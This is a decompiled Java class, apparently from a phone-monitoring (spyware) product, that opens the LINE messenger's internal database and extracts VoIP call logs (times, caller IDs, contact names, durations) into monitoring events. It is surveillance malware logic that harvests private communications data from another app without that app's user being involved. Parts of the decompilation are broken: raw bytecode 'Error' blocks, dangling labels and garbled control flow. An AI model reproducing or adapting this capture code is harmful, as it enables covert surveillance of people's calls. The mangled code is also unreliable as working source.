package com.vvt.capture.c.b.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.vvt.base.FxEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxVoipCallLogEvent;
import com.vvt.events.FxVoipCallLogEvent.FxIsMonitor;
import com.vvt.events.FxVoipCategory;
import com.vvt.h.d;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.im.events.info.ICallLogData.IsMonitor;
import com.vvt.p.c;
import java.util.ArrayList;
import java.util.HashMap;

public class b
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      return;
    }
  }
  
  /* Error */
  public static long a(int paramInt)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: ldc 24
    //   4: astore_2
    //   5: ldc 26
    //   7: astore_3
    //   8: aload_2
    //   9: aload_3
    //   10: invokestatic 31	com/vvt/p/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   13: astore_3
    //   14: aload_3
    //   15: iload_0
    //   16: invokestatic 34	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;I)J
    //   19: lstore 4
    //   21: getstatic 14	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	Z
    //   24: istore 6
    //   26: iload 6
    //   28: ifeq +3 -> 31
    //   31: aload_3
    //   32: ifnull +7 -> 39
    //   35: aload_3
    //   36: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   39: lload 4
    //   41: lreturn
    //   42: astore_2
    //   43: aconst_null
    //   44: astore_3
    //   45: iconst_m1
    //   46: i2l
    //   47: lstore 4
    //   49: getstatic 22	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   52: istore 6
    //   54: iload 6
    //   56: ifeq +3 -> 59
    //   59: aload_3
    //   60: ifnull -21 -> 39
    //   63: goto -28 -> 35
    //   66: astore_2
    //   67: aconst_null
    //   68: astore_3
    //   69: aload_2
    //   70: astore_1
    //   71: aload_3
    //   72: ifnull +7 -> 79
    //   75: aload_3
    //   76: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   79: aload_1
    //   80: athrow
    //   81: astore_1
    //   82: goto -11 -> 71
    //   85: astore_1
    //   86: goto -41 -> 45
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	89	0	paramInt	int
    //   1	79	1	localObject1	Object
    //   81	1	1	localObject2	Object
    //   85	1	1	localException1	Exception
    //   4	5	2	str	String
    //   42	1	2	localException2	Exception
    //   66	4	2	localObject3	Object
    //   7	69	3	localObject4	Object
    //   19	29	4	l	long
    //   24	31	6	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   9	13	42	java/lang/Exception
    //   9	13	66	finally
    //   15	19	81	finally
    //   21	24	81	finally
    //   49	52	81	finally
    //   15	19	85	java/lang/Exception
    //   21	24	85	java/lang/Exception
  }
  
  private static long a(SQLiteDatabase paramSQLiteDatabase)
  {
    return a(paramSQLiteDatabase, 1);
  }
  
  /* Error */
  public static long a(SQLiteDatabase paramSQLiteDatabase, int paramInt)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: aconst_null
    //   4: astore 4
    //   6: iconst_m1
    //   7: istore 5
    //   9: iload_1
    //   10: iload 5
    //   12: if_icmpeq +267 -> 279
    //   15: ldc 44
    //   17: astore 6
    //   19: ldc 46
    //   21: astore 7
    //   23: aconst_null
    //   24: astore 8
    //   26: ldc 48
    //   28: astore 9
    //   30: iconst_1
    //   31: istore 5
    //   33: iload 5
    //   35: anewarray 50	java/lang/String
    //   38: astore 10
    //   40: iconst_0
    //   41: istore 5
    //   43: aconst_null
    //   44: astore 11
    //   46: bipush 6
    //   48: istore 12
    //   50: iload 12
    //   52: invokestatic 55	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   55: astore 13
    //   57: aload 10
    //   59: iconst_0
    //   60: aload 13
    //   62: aastore
    //   63: iconst_0
    //   64: istore 12
    //   66: aconst_null
    //   67: astore 13
    //   69: iload_1
    //   70: invokestatic 60	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   73: astore 14
    //   75: aload_0
    //   76: astore 11
    //   78: aload_0
    //   79: aload 7
    //   81: aconst_null
    //   82: aload 9
    //   84: aload 10
    //   86: aconst_null
    //   87: aconst_null
    //   88: aload 6
    //   90: aload 14
    //   92: invokevirtual 64	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   95: astore 11
    //   97: aload 11
    //   99: ifnull +170 -> 269
    //   102: aload 11
    //   104: invokeinterface 70 1 0
    //   109: istore 15
    //   111: iload 15
    //   113: ifeq +62 -> 175
    //   116: ldc 72
    //   118: astore 7
    //   120: aload 11
    //   122: aload 7
    //   124: invokeinterface 76 2 0
    //   129: istore 15
    //   131: aload 11
    //   133: iload 15
    //   135: invokeinterface 80 2 0
    //   140: lstore 16
    //   142: lload 16
    //   144: lstore 18
    //   146: aload 11
    //   148: astore 8
    //   150: getstatic 14	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	Z
    //   153: istore 20
    //   155: iload 20
    //   157: ifeq +3 -> 160
    //   160: aload 8
    //   162: ifnull +10 -> 172
    //   165: aload 8
    //   167: invokeinterface 81 1 0
    //   172: lload 18
    //   174: lreturn
    //   175: lconst_0
    //   176: lstore 16
    //   178: lload 16
    //   180: lstore 18
    //   182: aload 11
    //   184: astore 8
    //   186: goto -36 -> 150
    //   189: astore 11
    //   191: aconst_null
    //   192: astore 8
    //   194: iconst_m1
    //   195: i2l
    //   196: lstore 18
    //   198: getstatic 22	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   201: istore 20
    //   203: iload 20
    //   205: ifeq +3 -> 208
    //   208: aload 8
    //   210: ifnull -38 -> 172
    //   213: goto -48 -> 165
    //   216: astore 11
    //   218: aload 4
    //   220: ifnull +10 -> 230
    //   223: aload 4
    //   225: invokeinterface 81 1 0
    //   230: aload 11
    //   232: athrow
    //   233: astore 7
    //   235: aload 11
    //   237: astore 4
    //   239: aload 7
    //   241: astore 11
    //   243: goto -25 -> 218
    //   246: astore 11
    //   248: aload 8
    //   250: astore 4
    //   252: goto -34 -> 218
    //   255: astore 7
    //   257: aload 11
    //   259: astore 8
    //   261: goto -67 -> 194
    //   264: astore 11
    //   266: goto -72 -> 194
    //   269: aload 11
    //   271: astore 8
    //   273: lload_2
    //   274: lstore 18
    //   276: goto -126 -> 150
    //   279: aconst_null
    //   280: astore 8
    //   282: lload_2
    //   283: lstore 18
    //   285: goto -135 -> 150
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	288	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	288	1	paramInt	int
    //   2	281	2	l1	long
    //   4	247	4	localObject1	Object
    //   7	35	5	i	int
    //   17	72	6	str1	String
    //   21	102	7	str2	String
    //   233	7	7	localObject2	Object
    //   255	1	7	localException1	Exception
    //   24	257	8	localObject3	Object
    //   28	55	9	str3	String
    //   38	47	10	arrayOfString	String[]
    //   44	139	11	localObject4	Object
    //   189	1	11	localException2	Exception
    //   216	20	11	localObject5	Object
    //   241	1	11	localObject6	Object
    //   246	12	11	localObject7	Object
    //   264	6	11	localException3	Exception
    //   48	17	12	j	int
    //   55	13	13	str4	String
    //   73	18	14	str5	String
    //   109	3	15	bool1	boolean
    //   129	5	15	k	int
    //   140	39	16	l2	long
    //   144	140	18	l3	long
    //   153	51	20	bool2	boolean
    // Exception table:
    //   from	to	target	type
    //   33	38	189	java/lang/Exception
    //   50	55	189	java/lang/Exception
    //   60	63	189	java/lang/Exception
    //   69	73	189	java/lang/Exception
    //   90	95	189	java/lang/Exception
    //   33	38	216	finally
    //   50	55	216	finally
    //   60	63	216	finally
    //   69	73	216	finally
    //   90	95	216	finally
    //   102	109	233	finally
    //   122	129	233	finally
    //   133	140	233	finally
    //   150	153	246	finally
    //   198	201	246	finally
    //   102	109	255	java/lang/Exception
    //   122	129	255	java/lang/Exception
    //   133	140	255	java/lang/Exception
    //   150	153	264	java/lang/Exception
  }
  
  public static long a(String paramString)
  {
    localSQLiteDatabase = null;
    long l = -1;
    int i = 17;
    try
    {
      localSQLiteDatabase = c.a(i, paramString);
      l = a(localSQLiteDatabase);
      bool = a;
      if (bool) {}
      if (localSQLiteDatabase == null) {
        break label39;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
        boolean bool = c;
        if ((bool) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label77;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    label39:
    return l;
  }
  
  public static long a(String paramString, int paramInt)
  {
    localSQLiteDatabase = null;
    long l = -1;
    int i = 17;
    try
    {
      localSQLiteDatabase = c.a(i, paramString);
      l = a(localSQLiteDatabase, paramInt);
      bool = a;
      if (bool) {}
      if (localSQLiteDatabase == null) {
        break label40;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        if (localSQLiteDatabase != null) {
          localSQLiteDatabase.close();
        }
        boolean bool = c;
        if ((bool) && (localSQLiteDatabase == null)) {}
      }
    }
    finally
    {
      if (localSQLiteDatabase == null) {
        break label78;
      }
      localSQLiteDatabase.close();
    }
    localSQLiteDatabase.close();
    label40:
    return l;
  }
  
  public static FxEvent a(com.vvt.capture.c.a parama)
  {
    FxVoipCallLogEvent localFxVoipCallLogEvent = new com/vvt/events/FxVoipCallLogEvent;
    localFxVoipCallLogEvent.<init>();
    long l = parama.h();
    localFxVoipCallLogEvent.setEventTime(l);
    Object localObject1 = FxVoipCategory.LINE;
    localFxVoipCallLogEvent.setVoipCategory((FxVoipCategory)localObject1);
    localObject1 = FxEventDirection.MISSED_CALL;
    Object localObject2 = parama.i();
    ICallLogData.Direction localDirection = ICallLogData.Direction.IN;
    if (localObject2 == localDirection)
    {
      localObject1 = FxEventDirection.IN;
      localFxVoipCallLogEvent.setDirection((FxEventDirection)localObject1);
      l = parama.a();
      localFxVoipCallLogEvent.setDuration(l);
      localObject1 = parama.b();
      localFxVoipCallLogEvent.setUserId((String)localObject1);
      localObject1 = parama.c();
      localFxVoipCallLogEvent.setContactName((String)localObject1);
      int i = parama.d();
      l = i;
      localFxVoipCallLogEvent.setTransferredBytes(l);
      localObject1 = parama.e();
      localObject2 = ICallLogData.IsMonitor.YES;
      if (localObject1 != localObject2) {
        break label180;
      }
    }
    label180:
    for (localObject1 = FxVoipCallLogEvent.FxIsMonitor.YES;; localObject1 = FxVoipCallLogEvent.FxIsMonitor.NO)
    {
      localFxVoipCallLogEvent.setIsMonitor((FxVoipCallLogEvent.FxIsMonitor)localObject1);
      l = parama.f();
      localFxVoipCallLogEvent.setFrameStripId(l);
      return localFxVoipCallLogEvent;
      localObject2 = parama.i();
      localDirection = ICallLogData.Direction.OUT;
      if (localObject2 != localDirection) {
        break;
      }
      localObject1 = FxEventDirection.OUT;
      break;
    }
  }
  
  private static ICallLogData.Direction a(int paramInt, long paramLong)
  {
    ICallLogData.Direction localDirection1 = ICallLogData.Direction.UNKNOWN;
    switch (paramInt)
    {
    }
    for (;;)
    {
      ICallLogData.Direction localDirection2 = ICallLogData.Direction.IN;
      if (localDirection1 == localDirection2)
      {
        long l = 0L;
        boolean bool = paramLong < l;
        if (!bool) {
          localDirection1 = ICallLogData.Direction.MISSED_CALL;
        }
      }
      return localDirection1;
      localDirection1 = ICallLogData.Direction.IN;
      continue;
      localDirection1 = ICallLogData.Direction.OUT;
    }
  }
  
  public static String a()
  {
    Object[] arrayOfObject = new Object[12];
    String str = b("created_time");
    arrayOfObject[0] = str;
    str = b("from_mid");
    arrayOfObject[1] = str;
    str = c("name");
    arrayOfObject[2] = str;
    str = b("parameter");
    arrayOfObject[3] = str;
    str = c("addressbook_name");
    arrayOfObject[4] = str;
    arrayOfObject[5] = "chat_history";
    arrayOfObject[6] = "chat_history";
    arrayOfObject[7] = "contacts";
    arrayOfObject[8] = "contacts";
    str = b("chat_id");
    arrayOfObject[9] = str;
    str = c("m_id");
    arrayOfObject[10] = str;
    str = b("id");
    arrayOfObject[11] = str;
    return String.format("SELECT %s,%s,%s,%s,%s FROM %s %s LEFT JOIN %s %s ON %s = %s ORDER BY %s DESC LIMIT 1", arrayOfObject);
  }
  
  public static ArrayList a(long paramLong1, long paramLong2, d paramd)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = false;
    Object localObject1 = null;
    Object localObject2 = "jp.naver.line.android";
    String str = "naver_line";
    for (;;)
    {
      try
      {
        localObject1 = c.a((String)localObject2, str);
        if (localObject1 != null) {}
        boolean bool2;
        Object localObject3 = localArrayList;
      }
      catch (Exception localException)
      {
        try
        {
          localObject2 = a((SQLiteDatabase)localObject1, paramLong1, paramLong2, paramd);
          if (localObject1 != null) {
            ((SQLiteDatabase)localObject1).close();
          }
          localObject1 = localObject2;
          bool2 = b;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          return (ArrayList)localObject1;
        }
        finally
        {
          localObject3 = localObject1;
          localObject1 = localObject5;
          continue;
        }
        localException = localException;
        bool2 = c;
        if ((!bool2) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        localObject1 = localArrayList;
      }
      finally
      {
        localObject4 = finally;
        bool2 = false;
        localObject3 = null;
        localObject1 = localObject4;
        if (localObject3 != null) {
          ((SQLiteDatabase)localObject3).close();
        }
        throw ((Throwable)localObject1);
      }
    }
  }
  
  public static ArrayList a(Cursor paramCursor, d paramd)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = paramCursor.moveToNext();
    if (bool1)
    {
      int i = paramCursor.getColumnIndex("created_time");
      long l1 = paramCursor.getLong(i);
      i = paramCursor.getColumnIndex("from_mid");
      Object localObject1 = paramCursor.getString(i);
      int j;
      if (localObject1 == null)
      {
        i = 1;
        j = i;
      }
      for (;;)
      {
        i = paramCursor.getColumnIndex("parameter");
        localObject1 = paramCursor.getString(i);
        int k = paramCursor.getColumnIndex("name");
        String str1 = paramCursor.getString(k);
        int m = paramCursor.getColumnIndex("addressbook_name");
        Object localObject2 = paramCursor.getString(m);
        localObject1 = d((String)localObject1);
        if (localObject1 == null) {
          break;
        }
        String str2 = "DURATION";
        double d1 = Long.valueOf(com.vvt.ag.b.b((String)((HashMap)localObject1).get(str2))).longValue();
        double d2 = 1000.0D;
        d1 = Math.ceil(d1 / d2);
        long l2 = d1;
        localObject1 = paramd.b((String)localObject2);
        if (localObject1 == null) {
          localObject1 = str1;
        }
        localObject2 = new com/vvt/capture/c/a;
        ((com.vvt.capture.c.a)localObject2).<init>();
        ((com.vvt.capture.c.a)localObject2).b(l1);
        ICallLogData.Direction localDirection = a(j, l2);
        ((com.vvt.capture.c.a)localObject2).a(localDirection);
        ((com.vvt.capture.c.a)localObject2).a(l2);
        ((com.vvt.capture.c.a)localObject2).a((String)localObject1);
        ((com.vvt.capture.c.a)localObject2).b(str1);
        ((com.vvt.capture.c.a)localObject2).a(0);
        localObject1 = ICallLogData.IsMonitor.NO;
        ((com.vvt.capture.c.a)localObject2).a((ICallLogData.IsMonitor)localObject1);
        ((com.vvt.capture.c.a)localObject2).b(0);
        boolean bool2 = a;
        if (bool2) {}
        localArrayList.add(localObject2);
        break;
        j = 0;
        localDirection = null;
      }
    }
    return localArrayList;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, long paramLong1, long paramLong2, d paramd)
  {
    localCursor = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      String str1 = c();
      int i = 2;
      String[] arrayOfString = new String[i];
      int j = 0;
      String str2 = Long.toString(paramLong1);
      arrayOfString[0] = str2;
      j = 1;
      str2 = Long.toString(paramLong2);
      arrayOfString[j] = str2;
      localCursor = paramSQLiteDatabase.rawQuery(str1, arrayOfString);
      if (localCursor != null) {
        localArrayList = a(localCursor, paramd);
      }
      if (localCursor == null) {
        break label95;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = c;
        if ((bool) && (localCursor == null)) {}
      }
    }
    finally
    {
      if (localCursor == null) {
        break label132;
      }
      localCursor.close();
    }
    localCursor.close();
    label95:
    return localArrayList;
  }
  
  public static ArrayList a(String paramString, long paramLong1, long paramLong2, d paramd)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = null;
    int i = 17;
    for (;;)
    {
      try
      {
        SQLiteDatabase localSQLiteDatabase = c.a(i, paramString);
        if (localSQLiteDatabase != null) {}
        boolean bool2;
        Object localObject3;
        localObject1 = localArrayList;
      }
      finally
      {
        try
        {
          localObject1 = a(localSQLiteDatabase, paramLong1, paramLong2, paramd);
          if (localSQLiteDatabase != null) {
            localSQLiteDatabase.close();
          }
          bool2 = b;
          if (bool2) {}
          bool2 = a;
          if (bool2) {}
          return (ArrayList)localObject1;
        }
        finally
        {
          localObject1 = localObject2;
          localObject3 = localObject4;
        }
        localObject2 = finally;
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
      }
    }
  }
  
  /* Error */
  public static long b()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_0
    //   2: ldc 24
    //   4: astore_1
    //   5: ldc 26
    //   7: astore_2
    //   8: aload_1
    //   9: aload_2
    //   10: invokestatic 31	com/vvt/p/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   13: astore_2
    //   14: aload_2
    //   15: invokestatic 88	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;)J
    //   18: lstore_3
    //   19: getstatic 14	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:a	Z
    //   22: istore 5
    //   24: iload 5
    //   26: ifeq +3 -> 29
    //   29: aload_2
    //   30: ifnull +7 -> 37
    //   33: aload_2
    //   34: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   37: lload_3
    //   38: lreturn
    //   39: astore_1
    //   40: aconst_null
    //   41: astore_2
    //   42: iconst_m1
    //   43: i2l
    //   44: lstore_3
    //   45: getstatic 22	com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   48: istore 5
    //   50: iload 5
    //   52: ifeq +3 -> 55
    //   55: aload_2
    //   56: ifnull -19 -> 37
    //   59: goto -26 -> 33
    //   62: astore_1
    //   63: aconst_null
    //   64: astore_2
    //   65: aload_1
    //   66: astore_0
    //   67: aload_2
    //   68: ifnull +7 -> 75
    //   71: aload_2
    //   72: invokevirtual 40	android/database/sqlite/SQLiteDatabase:close	()V
    //   75: aload_0
    //   76: athrow
    //   77: astore_0
    //   78: goto -11 -> 67
    //   81: astore_0
    //   82: goto -40 -> 42
    // Local variable table:
    //   start	length	slot	name	signature
    //   1	75	0	localObject1	Object
    //   77	1	0	localObject2	Object
    //   81	1	0	localException1	Exception
    //   4	5	1	str	String
    //   39	1	1	localException2	Exception
    //   62	4	1	localObject3	Object
    //   7	65	2	localObject4	Object
    //   18	27	3	l	long
    //   22	29	5	bool	boolean
    // Exception table:
    //   from	to	target	type
    //   9	13	39	java/lang/Exception
    //   9	13	62	finally
    //   14	18	77	finally
    //   19	22	77	finally
    //   45	48	77	finally
    //   14	18	81	java/lang/Exception
    //   19	22	81	java/lang/Exception
  }
  
  private static String b(String paramString)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>("chat_history");
    return "." + paramString;
  }
  
  private static final String c()
  {
    int i = 6;
    Object[] arrayOfObject = new Object[15];
    Object localObject = b("created_time");
    arrayOfObject[0] = localObject;
    localObject = b("from_mid");
    arrayOfObject[1] = localObject;
    localObject = c("name");
    arrayOfObject[2] = localObject;
    localObject = b("parameter");
    arrayOfObject[3] = localObject;
    localObject = c("addressbook_name");
    arrayOfObject[4] = localObject;
    arrayOfObject[5] = "chat_history";
    arrayOfObject[i] = "chat_history";
    arrayOfObject[7] = "contacts";
    arrayOfObject[8] = "contacts";
    localObject = b("chat_id");
    arrayOfObject[9] = localObject;
    localObject = c("m_id");
    arrayOfObject[10] = localObject;
    localObject = b("attachement_type");
    arrayOfObject[11] = localObject;
    localObject = Integer.valueOf(i);
    arrayOfObject[12] = localObject;
    localObject = b("id");
    arrayOfObject[13] = localObject;
    localObject = b("id");
    arrayOfObject[14] = localObject;
    return String.format("SELECT %s,%s,%s,%s,%s FROM %s %s LEFT JOIN %s %s ON %s = %s WHERE %s = %d AND %s > ? AND %s <= ?", arrayOfObject);
  }
  
  private static String c(String paramString)
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>("contacts");
    return "." + paramString;
  }
  
  private static HashMap d(String paramString)
  {
    int i = 0;
    Object localObject = null;
    boolean bool = com.vvt.ag.b.a(paramString);
    if (!bool)
    {
      HashMap localHashMap = new java/util/HashMap;
      localHashMap.<init>();
      String[] arrayOfString = paramString.split("\t");
      i = 0;
      localObject = null;
      for (;;)
      {
        int j = arrayOfString.length;
        if (i >= j) {
          break;
        }
        String str1 = arrayOfString[i];
        int k = i + 1;
        String str2 = arrayOfString[k];
        localHashMap.put(str1, str2);
        i += 2;
      }
      localObject = localHashMap;
    }
    return (HashMap)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/removeFromPath/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */